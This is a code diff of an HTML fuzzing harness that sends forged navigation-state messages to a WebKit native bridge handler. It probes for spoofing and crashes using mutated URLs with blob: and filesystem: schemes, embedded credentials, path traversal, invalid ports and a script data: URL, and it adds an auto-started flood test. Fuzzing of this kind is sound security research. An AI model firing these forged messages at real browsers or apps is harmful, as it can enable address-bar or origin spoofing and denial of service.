@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
     <meta charset="utf-8">
-    <title>Advanced Mutation Fuzzer & Boundary Harness - Hybrid Pro (Fixed)</title>
+    <title>Advanced Mutation Fuzzer &amp; Boundary Harness - Hybrid Pro (Hardened)</title>
     <style>
         :root {
             --bg-color: #05070b;
@@ -171,6 +171,7 @@
 
         let sentCount = 0;
         let errorCount = 0;
+        let isRunning = false;
 
         function log(msg) {
             const pre = document.getElementById('fuzz-log');
@@ -193,7 +194,6 @@
         }
         log('[-] Current Origin: ' + location.origin);
 
-        // Safe bridge verification
         let mh = null;
         const hasNativeBridge = window.webkit && 
                                 window.webkit.messageHandlers && 
@@ -234,27 +234,24 @@
             const schemes = ["blob:https://", "blob:http://", "filesystem:https://"];
             const paths = ["/signin", "/auth", "/oauth/v2/token", "/dashboard", "/../bypass"];
             
-            // Variasi Port Tidak Valid & Ekstrem
             const invalidPorts = [
-                ":999999",     // Port di luar rentang valid (overflow)
-                ":0",          // Port 0
-                ":-80",        // Port negatif
-                ":abc",        // Port non-numerik
-                ":65536",      // Batas maksimum port + 1
-                ":443/extra",  // Karakter ilegal setelah port
-                ":"            // Kolon kosong
+                ":999999",     
+                ":0",          
+                ":-80",        
+                ":abc",        
+                ":65536",      
+                ":443/extra",  
+                ":"            
             ];
 
             let vectors = [];
             baseDomains.forEach(function(domain) {
                 schemes.forEach(function(scheme) {
                     paths.forEach(function(path) {
-                        // Vektor standar
                         vectors.push(scheme + domain + path);
                         vectors.push(scheme + "user:pass@" + domain + path);
                         vectors.push(scheme + domain + "%2f%2e%2e" + path);
 
-                        // Kombinasi dengan port tidak valid
                         invalidPorts.forEach(function(port) {
                             vectors.push(scheme + domain + port + path);
                             vectors.push(scheme + "user:pass@" + domain + port + path);
@@ -266,11 +263,12 @@
             vectors.push("blob:null/opaque-origin-test");
             vectors.push("data:text/html,<script>console.log('fuzz')</script>");
             vectors.push("about:blank");
+            
             return vectors;
         }
 
         const mutatedVectors = generateMutatedVectors();
-        log('[+] Berhasil memuat ' + mutatedVectors.length + ' variasi vektor mutasi URL (termasuk port tidak valid).');
+        log('[+] Berhasil memuat ' + mutatedVectors.length + ' variasi vektor mutasi URL.');
 
         function sendNavigationMessage(targetUrl, stateObj) {
             try {
@@ -280,15 +278,15 @@
 
                 mh.NavigationEventMessage.postMessage({
                     command: 'willChangeState',
-                    frame_id: frameId
+                    frame_id: String(frameId)
                 });
                 
                 mh.NavigationEventMessage.postMessage({
                     command: 'didReplaceState',
-                    frame_id: frameId,
-                    stateObject: JSON.stringify(stateObj),
+                    frame_id: String(frameId),
+                    stateObject: JSON.stringify(stateObj || {}),
                     baseUrl: 'https://x/',
-                    pageUrl: targetUrl
+                    pageUrl: String(targetUrl)
                 });
                 
                 sentCount++;
@@ -301,6 +299,11 @@
         }
 
         function executeMutationTest() {
+            if (isRunning) {
+                log('[!] Pengujian lain sedang berjalan. Harap tunggu.');
+                return;
+            }
+            isRunning = true;
             log('\n[*] Memulai pengiriman batch mutasi secara asinkron...');
             let index = 0;
 
@@ -315,6 +318,7 @@
                     updateStats();
                     setTimeout(processNext, 15);
                 } else {
+                    isRunning = false;
                     log('[*] Batch mutasi selesai diproses.');
                 }
             }
@@ -322,6 +326,11 @@
         }
 
         function executeFloodTest() {
+            if (isRunning) {
+                log('[!] Pengujian lain sedang berjalan. Harap tunggu.');
+                return;
+            }
+            isRunning = true;
             log('\n[*] Memulai Flood Test stabil (1,000 iterasi)...');
             let count = 0;
             const total = 1000;
@@ -339,45 +348,53 @@
                 if (count < total) {
                     setTimeout(sendBatch, 10);
                 } else {
+                    isRunning = false;
                     log('[+] Flood Test 1,000 iterasi selesai dengan stabil.');
                 }
             }
             sendBatch();
         }
 
-        const runCustomBtn = document.getElementById('run-custom');
-        if (runCustomBtn) {
-            runCustomBtn.onclick = function() {
-                const customInput = document.getElementById('custom-url-input');
-                let customUrl = customInput ? customInput.value.trim() : '';
-                if (!customUrl) {
-                    alert('Masukkan URL target terlebih dahulu!');
-                    return;
-                }
-                log('\n[*] Menguji URL Kustom: ' + customUrl);
-                let success = sendNavigationMessage(customUrl, { customTest: true, time: Date.now() });
-                updateStats();
-                if (success) {
-                    log('   [ok] Pesan URL kustom berhasil dikirim.');
-                }
-            };
-        }
+        window.addEventListener('DOMContentLoaded', function() {
+            const runCustomBtn = document.getElementById('run-custom');
+            if (runCustomBtn) {
+                runCustomBtn.addEventListener('click', function() {
+                    const customInput = document.getElementById('custom-url-input');
+                    let customUrl = customInput ? customInput.value.trim() : '';
+                    if (!customUrl) {
+                        alert('Masukkan URL target terlebih dahulu!');
+                        return;
+                    }
+                    log('\n[*] Menguji URL Kustom: ' + customUrl);
+                    let success = sendNavigationMessage(customUrl, { customTest: true, time: Date.now() });
+                    updateStats();
+                    if (success) {
+                        log('   [ok] Pesan URL kustom berhasil dikirim.');
+                    }
+                });
+            }
 
-        const runMutBtn = document.getElementById('run-mutation');
-        if (runMutBtn) runMutBtn.onclick = executeMutationTest;
+            const runMutBtn = document.getElementById('run-mutation');
+            if (runMutBtn) {
+                runMutBtn.addEventListener('click', executeMutationTest);
+            }
 
-        const runFloodBtn = document.getElementById('run-flood');
-        if (runFloodBtn) runFloodBtn.onclick = executeFloodTest;
+            const runFloodBtn = document.getElementById('run-flood');
+            if (runFloodBtn) {
+                runFloodBtn.addEventListener('click', executeFloodTest);
+            }
 
-        const runResetBtn = document.getElementById('run-reset');
-        if (runResetBtn) {
-            runResetBtn.onclick = function() {
-                sentCount = 0;
-                errorCount = 0;
-                updateStats();
-                log('[*] Statistik berhasil direset.');
-            };
-        }
+            const runResetBtn = document.getElementById('run-reset');
+            if (runResetBtn) {
+                runResetBtn.addEventListener('click', function() {
+                    sentCount = 0;
+                    errorCount = 0;
+                    isRunning = false;
+                    updateStats();
+                    log('[*] Statistik berhasil direset.');
+                });
+            }
+        });
 
         setTimeout(executeMutationTest, 1200);
 
